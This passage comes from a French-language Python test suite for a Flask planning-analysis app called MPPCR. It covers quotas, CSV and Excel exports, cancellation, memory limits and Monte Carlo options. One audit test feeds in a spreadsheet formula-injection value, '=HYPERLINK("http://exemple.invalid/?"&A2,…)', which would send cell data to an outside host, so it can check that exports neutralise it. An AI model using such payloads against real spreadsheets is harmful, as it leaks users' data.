check("seul le créneau courant subsiste après purge", left == 1, f"={left}")
app.release_analysis_slot(slot_orphan)
with sqlite3.connect(db) as conn:
    left = conn.execute("SELECT COUNT(*) FROM running").fetchone()[0]
check("libération -> table des créneaux vide", left == 0, f"={left}")

# Sémaphore plein : 503, Retry-After, et surtout aucun quota consommé (IP neuve)
ip_busy = "203.0.113.90"
slot_busy = app.acquire_analysis_slot(ip_busy)
r = client.post("/analyse", data={"analysis": "dcma", "format": "page",
                                  "mpp_file": (io.BytesIO(b"pas un mpp"), "planning.mpp")},
                content_type="multipart/form-data", headers={"X-Forwarded-For": ip_busy})
body_busy = r.get_data(as_text=True)
check("sémaphore plein -> 503", r.status_code == 503, f"={r.status_code}")
check("503 : en-tête Retry-After", r.headers.get("Retry-After") == "30",
      f"={r.headers.get('Retry-After')}")
check("503 : page « Analyse en cours »", "Analyse en cours" in body_busy
      and 'class="alert alert-warn"' in body_busy)
check("503 : quota non consommé", app.quota_remaining(ip_busy) == app.DAILY_ANALYSIS_LIMIT,
      f"={app.quota_remaining(ip_busy)}")
app.release_analysis_slot(slot_busy)

# Échec de script : plus aucune analyse décomptée (comportement corrigé)
ip_fail = "203.0.113.91"
r = client.post("/analyse", data={"analysis": "dcma", "format": "page",
                                  "mpp_file": (io.BytesIO(b"pas un mpp"), "planning.mpp")},
                content_type="multipart/form-data", headers={"X-Forwarded-For": ip_fail})
check("échec du script -> 400", r.status_code == 400, f"={r.status_code}")
check("échec du script -> quota intact", app.quota_remaining(ip_fail) == app.DAILY_ANALYSIS_LIMIT,
      f"={app.quota_remaining(ip_fail)}")

with sqlite3.connect(db) as conn:
    tables = sorted(r[0] for r in conn.execute("SELECT name FROM sqlite_master WHERE type='table'"))
check("tables usage et running présentes",
      {"usage", "running"}.issubset(set(tables)), f"={tables}")

# --------------------------------------------------------------------------
section("Exports CSV et Excel (lot 3)")

exports = [
    {"kind": "dcma", "title": "Diagnostic qualité DCMA-14", "parsed": parsed},
    {"kind": "montecarlo", "title": "Simulation Monte Carlo", "parsed": mc},
]

csv_bytes = app.csv_export_payload(exports, "RL.mpp")
csv_txt = csv_bytes.decode("utf-8-sig")
check("CSV : BOM UTF-8 pour Excel FR", csv_bytes.startswith(b"\xef\xbb\xbf"))
check("CSV : séparateur point-virgule et colonnes à jour",
      "N°;Contrôle;Résultat;Détail;Cible;Verdict;Tâches concernées (N° MS Project);"
      "Action recommandée" in csv_txt,
      f"={[l for l in csv_txt.splitlines() if l.startswith('N°;')]}")
for entete in ("SCORE DE CONFORMITÉ", "CONTRÔLES DCMA-14", "PRIORITÉS D'AMÉLIORATION",
               "SIMULATION MONTE CARLO", "INDICE DE CRITICITÉ PAR TÂCHE", "SORTIE BRUTE DCMA-14"):
    check(f"CSV : section « {entete} »", entete in csv_txt)
score_attendu = f"Score;{parsed['score']['score']};sur 100"
check("CSV : score exporté", score_attendu in csv_txt,
      f"attendu={score_attendu!r} trouvé={[l for l in csv_txt.splitlines() if l.startswith('Score')]}")
check("CSV : contrôles accentués", "Logic (tâches sans lien amont/aval)" in csv_txt)
check("CSV : écart vs CPM calculé", "+17.2" in csv_txt)
check("CSV : verdicts lisibles", ";À corriger;" in csv_txt or ";OK;" in csv_txt)
check("CSV : aucun HTML", "<td" not in csv_txt and "<div" not in csv_txt)
check("CSV : barème annoncé", "Barème du score de conformité;v1" in csv_txt.replace("\r", ""))

xlsx_bytes = app.xlsx_export_payload(exports, "RL.mpp")
check("XLSX : signature ZIP", xlsx_bytes[:2] == b"PK")
check("XLSX : taille plausible", len(xlsx_bytes) > 5000, f"={len(xlsx_bytes)} octets")
import zipfile
with zipfile.ZipFile(io.BytesIO(xlsx_bytes)) as z:
    noms = z.namelist()
    workbook = z.read("xl/workbook.xml").decode("utf-8")
check("XLSX : classeur valide", "xl/workbook.xml" in noms and "xl/worksheets/sheet1.xml" in noms)
check("XLSX : feuille « Contrôles DCMA-14 »", "Contrôles DCMA-14" in workbook)
check("XLSX : feuille « Monte Carlo »", "Monte Carlo" in workbook)

csv_dcma_seul = app.csv_export_payload([exports[0]], "RL.mpp").decode("utf-8-sig")
check("CSV : Monte Carlo absent quand seule l'analyse DCMA a tourné",
      "SIMULATION MONTE CARLO" not in csv_dcma_seul and "CONTRÔLES DCMA-14" in csv_dcma_seul)
xlsx_mc_seul = app.xlsx_export_payload([exports[1]], "RL.mpp")
with zipfile.ZipFile(io.BytesIO(xlsx_mc_seul)) as z:
    wb = z.read("xl/workbook.xml").decode("utf-8")
check("XLSX : une seule feuille quand une seule analyse",
      "Monte Carlo" in wb and "Contrôles DCMA-14" not in wb)

check("nom de fichier d'export sans accent ni espace",
      app.export_basename("Résumé projet.mpp").startswith("MPPCR_Resume_projet_"),
      f"={app.export_basename('Résumé projet.mpp')}")

with sqlite3.connect(db) as conn:
    pass


# --------------------------------------------------------------------------
section("Téléchargements intégrés à la page et annulation")

dl = app.build_downloads(["csv", "xlsx"], exports, "RL.mpp")
check("deux téléchargements préparés", len(dl) == 2, f"={len(dl)}")
check("liens autonomes en data:", all(d["href"].startswith("data:") for d in dl))
check("noms de fichiers datés et extensionnés",
      dl[0]["filename"].startswith("MPPCR_RL_") and dl[0]["filename"].endswith(".csv")
      and dl[1]["filename"].endswith(".xlsx"), f"={[d['filename'] for d in dl]}")
check("type MIME du classeur",
      "spreadsheetml.sheet" in dl[1]["href"], f"={dl[1]['href'][:60]}")
check("aucun fichier écrit côté serveur",
      not any(p.suffix in (".csv", ".xlsx") for p in Path(os.environ["CHECK_DIR"]).iterdir()),
      f"={list(Path(os.environ['CHECK_DIR']).iterdir())}")

# le contenu encodé doit être exactement celui des fonctions d'export
import base64 as _b64
check("CSV téléchargé identique à csv_export_payload",
      _b64.b64decode(dl[0]["href"].split(",", 1)[1]) == app.csv_export_payload(exports, "RL.mpp"))
check("XLSX téléchargé identique à xlsx_export_payload",
      _b64.b64decode(dl[1]["href"].split(",", 1)[1]) == app.xlsx_export_payload(exports, "RL.mpp"))
check("aucun export demandé -> aucun lien", app.build_downloads([], exports, "RL.mpp") == [])
check("format inconnu ignoré", app.build_downloads(["pdf"], exports, "RL.mpp") == [])

with app.app.test_request_context("/"):
    html_dl = app.render_template(
        "result.html", filename="RL.mpp",
        results=[{"kind": "dcma", "title": "t", "parsed": parsed}],
        labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS, downloads=dl)
check("page : boutons d'export de l'en-tête (CSV + Excel)",
      'class="head-actions"' in html_dl and html_dl.count('<a class="btn btn-ghost btn-sm"') == 2
      and html_dl.count('download="MPPCR_RL_') == 2)
check("page : bouton d'impression / PDF", 'id="print-btn"' in html_dl
      and "Imprimer / PDF" in html_dl and "window.print()" in html_dl)
check("page : aucun export inerte quand les deux sont demandés",
      html_dl.count('<span class="btn btn-ghost btn-sm"') == 0)
with app.app.test_request_context("/"):
    html_nodl = app.render_template(
        "result.html", filename="RL.mpp",
        results=[{"kind": "dcma", "title": "t", "parsed": parsed}],
        labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS)
check("page : exports inertes quand rien n'est demandé",
      'download="MPPCR_' not in html_nodl
      and html_nodl.count('<span class="btn btn-ghost btn-sm"') == 2
      and html_nodl.count('<a class="btn btn-ghost btn-sm"') == 0
      and 'id="print-btn"' in html_nodl
      and "Cochez « CSV »" in html_nodl)

# --- jeton d'annulation et interruption du sous-processus -----------------
check("jeton valide accepté", app.valid_token("a" * 32))
check("jeton invalide refusé",
      not app.valid_token("") and not app.valid_token("zz") and not app.valid_token("A" * 32))

jeton = secrets.token_hex(16)
check("annulation sans analyse en cours -> refusée",
      app.request_cancellation(jeton, "203.0.113.200") is False)

creneau = app.acquire_analysis_slot("203.0.113.200", jeton)
check("créneau réservé avec jeton", creneau is not None)
check("annulation depuis une autre IP refusée",
      app.request_cancellation(jeton, "203.0.113.201") is False)
check("annulation depuis la bonne IP acceptée",
      app.request_cancellation(jeton, "203.0.113.200") is True)
check("état d'annulation lisible", app.cancel_requested(jeton) is True)
app.release_analysis_slot(creneau)

# interruption réelle d'un sous-processus long
jeton2 = secrets.token_hex(16)
creneau2 = app.acquire_analysis_slot("203.0.113.202", jeton2)
resultat = {}


def _analyse_longue():
    try:
        app.run_script(
            [sys.executable, "-c", "import time; time.sleep(30); print('termine')"],
            "le test d'annulation", token=jeton2)
        resultat["sortie"] = "terminee"
    except BaseException as exc:  # noqa: BLE001
        resultat["erreur"] = exc


fil = threading.Thread(target=_analyse_longue, daemon=True)
debut = time.monotonic()
fil.start()
time.sleep(1.2)
app.request_cancellation(jeton2, "203.0.113.202")
fil.join(timeout=25)
duree = time.monotonic() - debut
check("annulation : le script est bien interrompu",
      isinstance(resultat.get("erreur"), app.AnalysisCancelled),
      f"={resultat.get('erreur') or resultat.get('sortie')}")
check("annulation : interruption rapide (moins de 15 s)", duree < 15, f"={duree:.1f} s")
check("annulation : fil terminé", not fil.is_alive())
app.release_analysis_slot(creneau2)

# un timeout reste un timeout, une fois le délai dépassé
app.TIMEOUT_SECONDS = 1
try:
    app.run_script([sys.executable, "-c", "import time; time.sleep(20)"], "le test de délai")
    check("délai maximal appliqué", False, "aucune exception")
except app.AnalysisError as exc:
    check("délai maximal appliqué", "délai maximal" in str(exc), f"={exc}")
finally:
    app.TIMEOUT_SECONDS = int(os.environ.get("ANALYSIS_TIMEOUT", "900"))


# --------------------------------------------------------------------------
section("Colonne « tâches concernées » (bloc DETAILS_TACHES)")

BLOC = """========================================================================
DIAGNOSTIC DCMA-14 — /tmp/x/RL.mpp
Date d'etat du projet : 2026-10-05T08:00
========================================================================
1. Logic (taches sans lien amont/aval)           14.29%  1/7              A CORRIGER
2. Leads (lag negatif)                             0.0%  0/5              OK

Resume : 1 controle(s) en ecart, 0 non applicable(s) faute de donnees, 13 OK.

========================================================================
DETAILS_TACHES (numeros MS Project des taches en ecart)
========================================================================
1|8,12,15
5|8
7|-
14|3,4
"""

details = app.parse_task_details(BLOC)
check("bloc de détail interprété", details.get(1) == [8, 12, 15] and details.get(5) == [8],
      f"={details}")
check("contrôle sans tâche -> liste vide", details.get(7) == [], f"={details.get(7)}")
check("contrôle absent ignoré", 12 not in details)
check("aucun bloc -> dictionnaire vide", app.parse_task_details("Resume : 0 OK.\n") == {})

avec = app.parse_dcma_output(BLOC)
check("parsing DCMA non perturbé par le bloc",
      avec["kpi"]["total"] == 2 and avec["kpi"]["ko"] == 1, f"={avec['kpi']}")
check("détails attachés au résultat analysé",
      avec["task_details"][1] == [8, 12, 15], f"={avec['task_details']}")
check("sortie brute conservée verbatim",
      "DETAILS_TACHES" in avec["raw"])

lignes = app.dcma_export_rows(avec)
check("export : colonne des tâches présentes",
      any("8, 12, 15" in ligne for ligne in lignes), f"={lignes}")
check("export : 8 colonnes", all(len(ligne) == 8 for ligne in lignes), f"={len(lignes[0])}")

with app.app.test_request_context("/"):
    html_ids = app.render_template(
        "result.html", filename="RL.mpp",
        results=[{"kind": "dcma", "title": "t", "parsed": avec}],
        labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS)
check("page : numéros de tâches en pastilles dans la priorité",
      'class="task-ids"' in html_ids and 'class="task-id">8<' in html_ids
      and 'class="task-id">12<' in html_ids and 'class="task-id">15<' in html_ids)
check("page : mention explicite des numéros MS Project",
      "Tâches concernées (numéros MS Project)" in html_ids)
check("page : aucune pastille quand la priorité n'a pas de tâche",
      html_ids.count('class="task-ids"') == 1)

# troncature au-delà de 20 identifiants
import copy as _copy
gros = _copy.deepcopy(avec)
gros["task_details"] = {1: list(range(1, 46))}
with app.app.test_request_context("/"):
    html_gros = app.render_template(
        "result.html", filename="RL.mpp",
        results=[{"kind": "dcma", "title": "t", "parsed": gros}],
        labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS)
check("page : toutes les pastilles quand la liste tient sous la limite",
      html_gros.count('class="task-id"') == 45 and "+autre" not in html_gros)

tres_gros = _copy.deepcopy(avec)
tres_gros["task_details"] = {1: list(range(1, 81))}
with app.app.test_request_context("/"):
    html_tres_gros = app.render_template(
        "result.html", filename="RL.mpp",
        results=[{"kind": "dcma", "title": "t", "parsed": tres_gros}],
        labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS)
check("page : 60 pastilles puis « +20 autres » au-delà de la limite",
      html_tres_gros.count('class="task-id"') == 61 and '>+20 autres<' in html_tres_gros
      and 'class="task-id">61<' not in html_tres_gros)
check("export : liste complète malgré la troncature d'affichage",
      "45" in app.dcma_export_rows(gros)[0][6], f"={app.dcma_export_rows(gros)[0][6][-20:]}")

csv_ids = app.csv_export_payload([{"kind": "dcma", "parsed": avec}], "RL.mpp").decode("utf-8-sig")
check("CSV : colonne des tâches concernées",
      "Tâches concernées (N° MS Project)" in csv_ids and "8, 12, 15" in csv_ids)


# --------------------------------------------------------------------------
section("Mémoire : limites, messages et détection")

check("limite publique de taille définie", app.MAX_UPLOAD_MB >= 1, f"={app.MAX_UPLOAD_MB}")
check("garde-fou Flask plus large que la limite publique (évite la connexion coupée)",
      app.HARD_UPLOAD_MB > app.MAX_UPLOAD_MB
      and app.app.config["MAX_CONTENT_LENGTH"] == app.HARD_UPLOAD_MB * 1024 * 1024,
      f"={app.HARD_UPLOAD_MB} vs {app.MAX_UPLOAD_MB}")

check("détection d'un tas plein", app.memory_shortage("java.lang.OutOfMemoryError: Java heap space"))
check("détection d'un tas trop petit", app.memory_shortage("Error occurred during initialization of VM\nToo small maximum heap"))
check("détection d'une allocation native impossible",
      app.memory_shortage("", "Cannot allocate memory"))
check("sortie normale non confondue", not app.memory_shortage("Resume : 0 controle(s) en ecart"))
check("erreur de fichier non confondue",
      not app.memory_shortage("java.io.FileNotFoundException: planning.mpp"))

message_memoire = app.memory_shortage_message()
check("message mémoire : cause et marche à suivre",
      "trop volumineux pour la mémoire" in message_memoire
      and "Réduisez le périmètre analysé" in message_memoire)

os.environ["JAVA_TOOL_OPTIONS"] = "-Xmx512m -XX:+UseSerialGC"
check("mémoire allouée lue depuis les options Java", app.configured_heap_mb() == 512,
      f"={app.configured_heap_mb()}")
check("mémoire annoncée dans le message", "512 Mo alloués" in app.memory_shortage_message())
os.environ["JAVA_TOOL_OPTIONS"] = "-Xmx2g"
check("unité Go interprétée", app.configured_heap_mb() == 2048, f"={app.configured_heap_mb()}")
os.environ.pop("JAVA_TOOL_OPTIONS", None)
check("options absentes -> mémoire inconnue", app.configured_heap_mb() is None)

message_taille = app.too_large_message(6 * 1024 * 1024)
check("message de taille : taille reçue et limite",
      "6.0 Mo reçus" in message_taille and f"{app.MAX_UPLOAD_MB} Mo" in message_taille,
      f"={message_taille[:120]}")
check("message de taille : conseil d'extrait", "extrait du planning" in message_taille)
check("message de taille sans taille connue", "Mo reçus" not in app.too_large_message())

check("pic mémoire du processus courant mesurable", app.peak_rss_mb(os.getpid()) > 0,
      f"={app.peak_rss_mb(os.getpid())}")
check("pic mémoire d'un pid inexistant = 0", app.peak_rss_mb(999999) == 0)

dockerfile = (STAGE / "Dockerfile").read_text(encoding="utf-8")
check("Dockerfile : limite de tas JVM explicite", "-Xmx" in dockerfile
      and "JAVA_TOOL_OPTIONS" in dockerfile)
check("Dockerfile : sortie immédiate en cas de manque de mémoire",
      "ExitOnOutOfMemoryError" in dockerfile)
for fichier in ("docker-compose.yml", "docker-compose.prod.yml"):
    compose = (STAGE / fichier).read_text(encoding="utf-8")
    check(f"{fichier} : conteneur plafonné en mémoire", "mem_limit:" in compose)
    check(f"{fichier} : sacrifié en priorité par le noyau", "oom_score_adj:" in compose)
    check(f"{fichier} : limite d'envoi exposée", "MAX_UPLOAD_MB" in compose)

with app.app.test_request_context("/"):
    html_form = app.render_template("index.html", quota_remaining=3, daily_limit=5,
                                    max_upload_mb=7, client_token="b" * 32)
check("formulaire : limite réelle annoncée", "7 Mo max" in html_form)
check("formulaire : avertissement mémoire", "peuvent être refusés" in html_form)
check("formulaire : contrôle de taille côté navigateur", 'data-max-mb="7"' in html_form)
check("version affichée dans l'en-tête et le pied de page",
      f'class="version-tag">{app.APP_VERSION}<' in html_form
      and f"MPPCR</b> {app.APP_VERSION} · MS Project Check &amp; Risk" in html_form,
      f"APP_VERSION={app.APP_VERSION}")
check("formulaire : options Monte Carlo de la maquette (listes déroulantes)",
      '<select id="sims" name="sims">' in html_form
      and '<option value="5000" selected>' in html_form
      and '<select id="factors" name="factors">' in html_form
      and '<option value="0.8/1.5" selected>' in html_form
      and 'name="estimates_file"' in html_form)
check("formulaire : trois étapes numérotées et panneau d'appel à l'action",
      html_form.count('class="step-num"') == 2 and 'class="cta-panel"' in html_form
      and 'class="btn btn-primary"' in html_form and 'class="dropzone"' in html_form)
check("formulaire : quota du panneau latéral", 'class="quota"' in html_form
      and "3 analyses restantes" in html_form)

# --------------------------------------------------------------------------
section("Options du formulaire v2 : facteurs PERT, simulations, estimations CSV")

check("options : choix de facteurs par défaut de la maquette",
      app.parse_montecarlo_options({"sims": "5000", "factors": "0.8/1.5"}) == (5000, 0.8, 1.5))
check("options : choix prudent de la maquette",
      app.parse_montecarlo_options({"sims": "1000", "factors": "0.7/1.8"}) == (1000, 0.7, 1.8))
check("options : 10 000 simulations acceptées",
      app.parse_montecarlo_options({"sims": "10000", "factors": "0.8/1.5"})[0] == 10000)
check("options : champs opt/pess toujours acceptés (appels directs)",
      app.parse_montecarlo_options({"opt": "0.9", "pess": "2"}) == (5000, 0.9, 2.0))
try:
    app.parse_montecarlo_options({"factors": "1.5/0.8"})
    _incoherent = False
except ValueError:
    _incoherent = True
check("options : facteurs incohérents refusés", _incoherent)


def _post_mc(factors, ip, estimates=None):
    """Analyse Monte Carlo réelle sur la fixture, quota par IP distinct."""
    donnees = {
        "analysis": "montecarlo",
        "sims": "1000",
        "factors": factors,
        "mpp_file": (io.BytesIO((STAGE / "test_projet.xml").read_bytes()), "planning.mpp"),
    }
    if estimates is not None:
        donnees["estimates_file"] = (io.BytesIO(estimates.encode("utf-8")), "estimations.csv")
    reponse = client.post("/analyse", data=donnees, content_type="multipart/form-data",
                          headers={"X-Forwarded-For": ip})
    if reponse.status_code != 200:
        return None, f"HTTP {reponse.status_code}"
    page = reponse.get_data(as_text=True)
    valeurs = re.findall(r'class="d-val"[^>]*>([0-9]+,[0-9]) <small>j</small>', page)
    return (valeurs, page), ""


if (STAGE / "test_projet.xml").exists():
    (defaut, err_defaut) = _post_mc("0.8/1.5", "203.0.113.50")
    (prudent, err_prudent) = _post_mc("0.7/1.8", "203.0.113.51")
    check("options : analyse Monte Carlo réelle avec les facteurs de la liste",
          defaut is not None and len(defaut[0]) == 4, err_defaut or f"={defaut and defaut[0]}")
    check("options : les facteurs choisis changent la durée simulée (P50)",
          defaut and prudent and defaut[0][1] != prudent[0][1],
          f"défaut={defaut and defaut[0]} prudent={prudent and prudent[0]}")

    csv_estimations = "task_id,optimistic,most_likely,pessimistic\n5,1,1,1\n"
    (avec_estimations, err_estimations) = _post_mc("0.8/1.5", "203.0.113.52", csv_estimations)
    check("options : CSV d'estimations 3 points pris en compte (P50 raccourci)",
          avec_estimations is not None and defaut is not None
          and float(avec_estimations[0][1].replace(",", "."))
          < float(defaut[0][1].replace(",", ".")),
          err_estimations or f"={avec_estimations and avec_estimations[0]}")

    (mauvais_csv, err_mauvais) = _post_mc(
        "0.8/1.5", "203.0.113.53",
        "task_id,optimistic,most_likely,pessimistic\n5,abc,1,1\n")
    check("options : CSV d'estimations illisible refusé proprement",
          mauvais_csv is None and err_mauvais.startswith("HTTP 4"),
          f"{err_mauvais}")

# --------------------------------------------------------------------------
section("Répartition du risque par lot (--macro-level 1 à 3)")

check("options : niveau de lot lu depuis la liste 1 à 3",
      [app.niveau_macro({"macro_level": str(n)}) for n in (1, 2, 3)] == [1, 2, 3])
check("options : répartition non demandée quand rien n'est choisi",
      app.niveau_macro({"macro_level": ""}) is None
      and app.niveau_macro({"macro_level": "aucune"}) is None
      and app.niveau_macro({}) is None)
for valeur in ("4", "0", "abc", "-1"):
    try:
        app.niveau_macro({"macro_level": valeur})
        _refuse = False
    except ValueError:
        _refuse = True
    check(f"options : niveau {valeur!r} refusé", _refuse)


def _plan_temoin(generateur, nom):
    """Génère un planning témoin MSPDI dans le répertoire de travail du harnais."""
    chemin = Path(os.environ["CHECK_DIR"]) / nom
    execution = subprocess.run([sys.executable, str(STAGE / generateur), str(chemin)],
                               cwd=str(STAGE), capture_output=True, text=True, timeout=180)
    if execution.returncode != 0:
        return None
    return chemin


def _mc_lot(chemin, niveau, sims="500"):
    """Exécute réellement montecarlo.py avec la répartition par lot demandée."""
    sortie = subprocess.run(
        [sys.executable, str(STAGE / "montecarlo.py"), str(chemin), "--sims", sims,
         "--macro-level", str(niveau)],
        cwd=str(STAGE), capture_output=True, text=True, timeout=600)
    return app.LOG4J_NOISE.sub("", sortie.stdout or "")


temoin_lots = _plan_temoin("lots_temoin.py", "lots_macro.xml")
temoin_recap = _plan_temoin("temoin_recap.py", "recap_macro.xml")
check("témoins disponibles (lots et liens de récapitulative)",
      temoin_lots is not None and temoin_recap is not None)

if temoin_lots and temoin_recap:
    mc_lots = app.parse_montecarlo_output(_mc_lot(temoin_lots, 1))
    check("lot : niveau demandé retenu", mc_lots["macro_level"] == 1,
          f"={mc_lots['macro_level']}")
    check("lot : quatre programmes et un seau hors lot",
          len(mc_lots["macros"]) == 5, f"={[m['name'] for m in mc_lots['macros']]}")
    check("lot : lignes triées par P90 décroissant",
          [m["p90"] for m in mc_lots["macros"]]
          == sorted((m["p90"] for m in mc_lots["macros"]), key=float, reverse=True),
          f"={[m['p90'] for m in mc_lots['macros']]}")
    check("lot : P50, P80, P90 et criticité numériques exploitables",
          all(m["p50_num"] > 0 and 0 <= m["criticite_num"] <= 100 for m in mc_lots["macros"])
          and all({"p80", "p90", "ecart"} <= set(m) for m in mc_lots["macros"]))
    # Ce témoin chaîne ses programmes par des liens portés par les récapitulatives :
    # c'est justement le défaut que l'avertissement doit signaler.
    check("avertissement : les lots chaînés par récapitulative sont signalés",
          mc_lots["macro_recap_links"] >= 1 and mc_lots.get("macro_warning"),
          f"={mc_lots['macro_recap_links']}")

    # Un planning dont tous les liens portent sur des tâches de détail (la règle)
    # ne doit rien déclencher.
    if (STAGE / "test_projet.xml").exists():
        mc_propre = app.parse_montecarlo_output(_mc_lot(STAGE / "test_projet.xml", 1))
        check("avertissement : silence quand tous les liens portent sur des détails",
              mc_propre["macro_recap_links"] == 0 and not mc_propre.get("macro_warning")
              and len(mc_propre["macros"]) == 3,
              f"={mc_propre['macro_recap_links']} lots={len(mc_propre['macros'])}")

    mc_recap = app.parse_montecarlo_output(_mc_lot(temoin_recap, 1))
    check("avertissement : lien porté par une récapitulative détecté",
          mc_recap["macro_recap_links"] == 1, f"={mc_recap['macro_recap_links']}")
    check("avertissement : exemple fourni et message rédigé",
          mc_recap["macro_recap_examples"]
          and "Phase 1" in mc_recap["macro_recap_examples"][0]
          and "récapitulative" in mc_recap.get("macro_warning", "")
          and "ignoré" in mc_recap.get("macro_warning", ""),
          f"={mc_recap.get('macro_warning', '')[:90]}")
    check("avertissement : la répartition reste produite (pas de correctif silencieux)",
          len(mc_recap["macros"]) == 2, f"={[m['name'] for m in mc_recap['macros']]}")

    mc_niveau_absent = app.parse_montecarlo_output(_mc_lot(temoin_recap, 3), 3)
    check("niveau absent : message du script repris en français",
          mc_niveau_absent["macro_level"] == 3 and not mc_niveau_absent["macros"]
          and "Aucune tâche récapitulative de niveau 3" in mc_niveau_absent["macro_message"]
          and "niveaux présents" in mc_niveau_absent["macro_message"],
          f"={mc_niveau_absent['macro_message']}")

    # Sortie par défaut : l'option ne doit rien changer sans elle.
    sans_option = app.LOG4J_NOISE.sub("", subprocess.run(
        [sys.executable, str(STAGE / "montecarlo.py"), str(temoin_recap), "--sims", "500"],
        cwd=str(STAGE), capture_output=True, text=True, timeout=600).stdout or "")
    check("lot : sans l'option, la sortie ne contient ni lot ni avertissement",
          "Repartition par macro-tache" not in sans_option
          and "Liens sur taches recapitulatives" not in sans_option)

    with app.app.test_request_context("/"):
        html_lot = app.render_template(
            "result.html", filename="LOTS.mpp",
            results=[{"kind": "montecarlo", "title": "Simulation Monte Carlo",
                      "parsed": mc_lots}],
            labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS,
            downloads=app.build_downloads(["csv", "xlsx"],
                                          [{"kind": "montecarlo", "parsed": mc_lots}],
                                          "LOTS.mpp"))
    check("page : titre et compteur de lots",
          "Répartition du risque par lot" in html_lot and "Niveau 1 · 5 lots" in html_lot)
    check("page : tableau des lots avec ses six colonnes",
          html_lot.count('class="card table-card"') == 1
          and "Criticité" in html_lot and "Écart P50 vs planifié" in html_lot
          and html_lot.count('class="ctrl-name"') == 5)
    check("page : écarts et durées à la virgule décimale",
          re.search(r'class="ctrl-result">[0-9]+,[0-9] ', html_lot) is not None
          and 'class="d-up"' in html_lot)
    check("page : la répartition n'apparaît que si elle est demandée",
          "Répartition du risque par lot" not in html_mc)

    with app.app.test_request_context("/"):
        html_recap = app.render_template(
            "result.html", filename="RECAP.mpp",
            results=[{"kind": "montecarlo", "title": "Simulation Monte Carlo",
                      "parsed": mc_recap}],
            labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS)
    check("page : avertissement sur les liens de récapitulative",
          'class="alert alert-warn"' in html_recap
          and "Liens portés par des tâches récapitulatives" in html_recap
          and "un lot peut finir avant son prédécesseur" in html_recap)

    with app.app.test_request_context("/"):
        html_niveau = app.render_template(
            "result.html", filename="RECAP.mpp",
            results=[{"kind": "montecarlo", "title": "Simulation Monte Carlo",
                      "parsed": mc_niveau_absent}],
            labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS)
    check("page : niveau absent expliqué sans tableau vide",
          'class="alert alert-info"' in html_niveau
          and "Répartition par lot indisponible" in html_niveau
          and 'class="card table-card"' not in html_niveau)

    csv_lot = app.csv_export_payload([{"kind": "montecarlo", "parsed": mc_lots}],
                                     "LOTS.mpp").decode("utf-8-sig")
    check("export CSV : section de répartition par lot",
          "# RÉPARTITION DU RISQUE PAR LOT;niveau 1" in csv_lot.replace("\r", "")
          and "Lot;P50 (j);P80 (j);P90 (j);Écart P50 vs planifié (j);Criticité (%)"
          in csv_lot.replace("\r", ""))
    check("export CSV : avertissement repris quand il existe",
          "récapitulative" in app.csv_export_payload(
              [{"kind": "montecarlo", "parsed": mc_recap}], "RECAP.mpp").decode("utf-8-sig"))
    classeur = app.xlsx_export_payload([{"kind": "montecarlo", "parsed": mc_lots}], "LOTS.mpp")
    import zipfile
    with zipfile.ZipFile(io.BytesIO(classeur)) as archive:
        contenu = "".join(archive.read(nom).decode("utf-8", "ignore")
                          for nom in archive.namelist()
                          if nom.endswith((".xml", ".rels")))
    check("export Excel : bloc de répartition par lot",
          "Répartition du risque par lot" in contenu and "Criticité (%)" in contenu
          and "Écart P50 vs planifié (j)" in contenu)


# --------------------------------------------------------------------------
section("Audit du 22/10/2026 : exports, quota, proxies, en-têtes, options")

import html as _html  # noqa: E402
from datetime import datetime as _dt, timedelta as _td, timezone as _tz  # noqa: E402

_nom_piege = '=HYPERLINK("http://exemple.invalid/?"&A2,"ouvrir")'
_sortie_piege = (
    "SIMULATION MONTE CARLO — x\nTaches de detail : 2\nLiens de dependance : 1\n"
    "Simulations : 10\nDuree deterministe (chemin critique, durees planifiees) : 20.0 j\n"
    "P50 (mediane simulee)  : 22.0 j  (+2.0 j vs planifie)\n"
    "P80                    : 24.0 j  (+4.0 j vs planifie)\n"
    "P90                    : 25.0 j  (+5.0 j vs planifie)\n"
    "Indice de criticite par tache (top 10 -- % de simulations sur le chemin critique) :\n"
    f"  {_nom_piege}   100.0%\n  @SUM(1)   80.0%\n  http://lien.invalid   50.0%\n")
_res_piege = [{"kind": "montecarlo", "parsed": app.parse_montecarlo_output(_sortie_piege)}]
with zipfile.ZipFile(io.BytesIO(app.xlsx_export_payload(_res_piege, "p.mpp"))) as _z:
    _feuille = _z.read("xl/worksheets/sheet1.xml").decode("utf-8")
    _liens = [n for n in _z.namelist() if n.endswith("sheet1.xml.rels")]
check("export Excel : un nom de tâche « =… » reste du texte (aucune formule)", "<f>" not in _feuille)
check("export Excel : une URL dans un nom ne devient pas un lien", not _liens, f"={_liens}")
_csv_piege = app.csv_export_payload(_res_piege, "p.mpp").decode("utf-8-sig")
check("export CSV : noms « = » et « @ » neutralisés par une apostrophe",
      "\"'=HYPERLINK" in _csv_piege and "'@SUM(1)" in _csv_piege)
check("export CSV : les écarts signés restent des nombres",
      app.neutraliser_formule("-1.5") == "-1.5" and app.neutraliser_formule("+4,0") == "+4,0")

for _o, _p in (("nan", "nan"), ("0.8", "inf"), ("0.8", "50"), ("1.2", "1.5")):
    try:
        app.parse_montecarlo_options({"opt": _o, "pess": _p})
        check(f"options : facteurs {_o} / {_p} refusés", False)
    except ValueError:
        check(f"options : facteurs {_o} / {_p} refusés", True)
try:
    app.parse_montecarlo_options({"sims": "50000"})
    check("options : 50 000 simulations refusées (maximum du formulaire : 10 000)", False)
except ValueError:
    check("options : 50 000 simulations refusées (maximum du formulaire : 10 000)", True)

check("créneaux : une analyse « les deux » n'est pas purgée avant 2 × délai",
      app.slot_stale_seconds() >= 2 * app.TIMEOUT_SECONDS + 120, f"={app.slot_stale_seconds()}")
_avant = (_dt.now(_tz.utc) - _td(seconds=app.TIMEOUT_SECONDS + 130)).isoformat()
with sqlite3.connect(db) as conn:
    conn.execute("DELETE FROM running")
    conn.execute("INSERT INTO running (ip, started_at) VALUES (?, ?)", ("198.51.100.70", _avant))
    conn.commit()
check("créneaux : analyse longue en cours conservée (limite toujours appliquée)",
      app.acquire_analysis_slot("198.51.100.71") is None)
with sqlite3.connect(db) as conn:
